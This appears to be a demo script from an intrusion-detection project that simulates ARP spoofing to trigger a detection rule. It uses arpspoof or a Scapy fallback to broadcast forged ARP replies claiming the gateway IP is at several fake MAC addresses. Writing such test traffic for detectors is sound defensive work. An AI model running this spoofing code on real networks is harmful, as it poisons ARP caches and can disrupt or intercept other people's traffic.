#!/bin/bash
# =============================================================================
# attack_arp.sh — ARP Spoofing Attack Simulation
#
# Sends gratuitous ARP replies with conflicting MAC addresses for the gateway
# IP. Detected by ArpSpoofRule when two or more unique MACs claim the same IP.
#
# Requirements: 8.1
# Tools: arpspoof (from dsniff), or Python fallback with scapy
# Usage:  ./demo/attack_arp.sh [gateway_ip] [interface]
#         Default: 192.168.1.1 on eth0
# =============================================================================

set -euo pipefail

GATEWAY="${1:-192.168.1.1}"
INTERFACE="${2:-eth0}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_FILE="${SCRIPT_DIR}/attack_arp.log"

echo "[*] ARP Spoofing Attack" | tee "${LOG_FILE}"
echo "[*] Target gateway: ${GATEWAY} on ${INTERFACE}" | tee -a "${LOG_FILE}"

if command -v arpspoof &>/dev/null; then
    echo "[*] Using arpspoof (dsniff)..." | tee -a "${LOG_FILE}"

    # Send a few gratuitous ARP replies with a fake MAC
    # Run in background and kill after a few seconds
    timeout 5 arpspoof -i "${INTERFACE}" -t "${GATEWAY}" "${GATEWAY}" 2>&1 | tee -a "${LOG_FILE}" || true

    echo "[*] ARP spoofing attempt complete." | tee -a "${LOG_FILE}"

elif python3 -c "import scapy.all" 2>/dev/null; then
    echo "[*] Using Python + Scapy fallback..." | tee -a "${LOG_FILE}"

    python3 -c "
import scapy.all as scapy
import time

gateway = '${GATEWAY}'
iface   = '${INTERFACE}'

# Fake MAC addresses to simulate spoofing
fake_macs = ['02:ba:be:ca:ff:ee', '02:de:ad:be:ef:01', '02:ca:fe:ba:be:02']

print('[*] Sending gratuitous ARP replies with conflicting MACs...')
for i, mac in enumerate(fake_macs):
    pkt = scapy.ARP(
        op=2,          # is-at (reply)
        psrc=gateway,  # spoofed source IP
        hwsrc=mac,     # spoofed source MAC
        pdst=gateway,  # target IP
        hwdst='ff:ff:ff:ff:ff:ff'  # broadcast
    )
    scapy.send(pkt, iface=iface, verbose=False)
    print(f'  → Sent ARP reply: {gateway} is at {mac}')
    time.sleep(0.5)
print('[*] ARP spoofing simulation complete.')
" 2>&1 | tee -a "${LOG_FILE}"

else
    echo "[!] Neither arpspoof nor Scapy available." | tee -a "${LOG_FILE}"
    echo "[!] Install: sudo apt-get install dsniff  or  pip install scapy" | tee -a "${LOG_FILE}"
    exit 1
fi

echo "[*] ARP spoofing simulation complete." | tee -a "${LOG_FILE}"
